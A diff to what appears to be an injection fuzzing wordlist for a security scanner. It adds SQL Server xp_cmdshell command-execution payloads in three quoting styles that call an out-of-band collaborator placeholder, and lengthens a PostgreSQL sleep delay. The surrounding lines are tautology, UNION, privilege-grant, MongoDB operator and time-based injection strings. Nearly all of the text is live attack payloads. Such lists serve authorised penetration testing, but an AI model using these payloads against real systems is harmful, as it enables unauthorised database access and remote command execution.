@@ -1,7 +1,9 @@
 ; --
 '; --
 '); --
-'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+'; exec master..xp_cmdshell '!-VARIABLE_COLLABORATOR-!'--
+"; exec master..xp_cmdshell "!-VARIABLE_COLLABORATOR-!"--
+`; exec master..xp_cmdshell `!-VARIABLE_COLLABORATOR-!`--
 ' grant connect to name; grant resource to name; --
 ' or 1=1 -- 
 ' union (select @@version) --
@@ -55,7 +57,7 @@ db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emi
 '%20%26%26%20this.passwordzz.match(/.*/)//+%00
 {$gt: ''}
 [$ne]=1
-';SELECT PG_SLEEP(5)--
+';SELECT PG_SLEEP(22)--
 ';sleep(22000);
 ';sleep(22000);'
 ';sleep(22000);+'
